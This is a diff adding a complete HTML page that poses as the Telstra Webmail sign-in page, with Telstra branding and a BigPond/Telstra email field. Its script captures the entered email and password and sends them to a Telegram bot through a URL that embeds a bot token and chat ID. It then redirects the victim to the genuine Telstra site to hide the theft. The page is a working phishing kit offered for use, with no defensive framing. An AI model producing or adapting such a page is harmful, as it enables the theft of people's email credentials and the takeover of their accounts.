@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Telstra Webmail</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e0f7fa; /* Light green background */
+            margin: 0;
+        }
+        /* Header styles with gradient background */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: linear-gradient(90deg, #d1c4e9, #b3e0ff); /* Light purple to light blue gradient */
+            padding: 20px 20px; /* Increased padding for more space */
+        }
+        .header h1 {
+            margin: 0;
+            font-family: Calibri, sans-serif; /* Calibri font */
+            font-size: 24px;
+            letter-spacing: 1px; /* Adjusted letter spacing */
+        }
+        .header a {
+            text-decoration: none;
+            color: #0056b3;
+            font-size: 16px;
+        }
+        .header a:hover {
+            text-decoration: underline;
+        }
+        /* Logo positioning with slight left alignment */
+        .logo {
+            margin-top: 10px; /* Space between header and logo */
+            margin-left: 80px; /* Move logo slightly to the left */
+        }
+        .logo img {
+            width: 50px; /* Set the width of the logo (adjust size as needed) */
+            height: auto;
+        }
+        /* Login container styles */
+        .login-container {
+            background-color: #e0f7fa; /* Same as body background */
+            padding: 40px 30px; /* Increased padding for more space */
+            width: 450px; /* Increased container width */
+            margin: 60px auto;
+            border-radius: 8px; /* Rounded corners for the container */
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 10px; /* Reduced bottom margin */
+            font-family: Calibri, sans-serif; /* Calibri font */
+            font-weight: bold; /* Make the text bold */
+            letter-spacing: 1px; /* Adjust letter spacing for spaciousness */
+            line-height: 1.4; /* Reduced space between lines */
+        }
+        .subheading {
+            text-align: center;
+            font-size: 16px; /* Increased font size */
+            font-weight: normal;
+            color: #555; /* Lighter color for the subheading */
+            margin-top: 5px; /* Reduced top margin */
+            margin-bottom: 15px; /* Reduced bottom margin */
+        }
+        .form-group {
+            margin-bottom: 20px; /* Reduced space between form elements */
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 10px; /* Added margin below label */
+            font-size: 16px; /* Increased label font size */
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 0; /* Increased padding for input fields */
+            font-size: 16px; /* Increased input text size */
+            border: none;
+            border-bottom: 1px solid #000; /* Thinner black bottom border */
+            background: transparent;
+            margin-bottom: 15px; /* Reduced space after input field */
+        }
+        .form-group input:focus {
+            border-color: #0056b3;
+            outline: none;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px; /* Increased button font size */
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #004085;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px; /* Slightly increased footer font size */
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Section with gradient background -->
+    <div class="header">
+        <h1>Telstra</h1>
+        <a href="#contact">Contact</a>
+    </div>
+
+    <!-- Logo positioned below the header and slightly left-aligned -->
+    <div class="logo">
+        <!-- Replace the Base64 string below with your actual Base64 encoded logo -->
+        <img src="data:image/png;base64,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"> 
+        <!-- The above is a placeholder Base64 image string. Replace it with your actual image's Base64 string -->
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <h2>Sign in to Telstra <br> Webmail</h2>
+        <p class="subheading">Sign in with your Telstra email address</p>
+        <form id="login-form" method="post">
+            <div class="form-group">
+                <label for="email">Telstra Email*</label>
+                <input type="email" id="email" name="email" placeholder="Enter your Telstra email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Continue</button>
+            </div>
+        </form>
+        <div class="footer">
+            <p>By signing in, you agree to Telstra's terms and privacy policy.</p>
+        </div>
+    </div>
+
+   <script>
+    // Telegram webhook URL (replace with the correct chat_id)
+    const webhookUrl = "https://api.telegram.org/bot7801700863:AAGKZl_ORbsGmMOEc8VxUfKKrkg9k-blgm0/sendMessage?chat_id=8088765429&text=";
+
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Get email and password
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        // Log the values to check if they're captured correctly
+        console.log("Email:", email);
+        console.log("Password:", password);
+
+        // Determine the login type based on the email domain
+        let loginType = '';
+        if (email.includes('@bigpond.com')) {
+            loginType = '*****BIGPOND LOGIN*******';
+        } else if (email.includes('@telstra.com')) {
+            loginType = '*****TELSTRA LOGIN*******';
+        }
+
+        // Prepare the message for Telegram with login type, email, and password
+        const message = `${loginType}\nUsername: ${email}\nPassword: ${password}`;
+
+        // Send data to Telegram before clearing the form or redirecting
+        fetch(webhookUrl + encodeURIComponent(message))
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Message sent successfully.");
+                } else {
+                    console.error("Error sending message to Telegram:", data);
+                }
+
+                // Clear the form
+                document.getElementById("login-form").reset();
+
+                // Redirect to the new URL
+                window.location.href = "https://www.myservices.telstra.com.au/";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                
+                // Even if there is an error, still clear the form and redirect
+                document.getElementById("login-form").reset();
+                window.location.href = "https://www.myservices.telstra.com.au/";
+            });
+    });
+</script>
+
+</body>
+</html>
